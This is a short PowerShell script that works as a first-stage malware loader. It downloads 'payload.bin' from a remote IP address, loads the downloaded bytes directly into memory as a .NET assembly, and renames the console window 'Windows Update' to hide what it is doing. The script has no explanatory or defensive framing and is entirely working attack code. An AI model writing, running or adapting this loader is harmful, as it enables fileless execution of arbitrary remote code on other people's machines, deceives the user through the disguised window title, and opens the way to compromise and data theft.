[CmdletBinding()]
param(
    [string]$Stage1Url = 'http://203.0.113.109/payload.bin'
)
$StageBytes = (New-Object System.Net.WebClient).DownloadData($Stage1Url)
[Reflection.Assembly]::Load($StageBytes)
$Host.UI.RawUI.WindowTitle = "Windows Update"
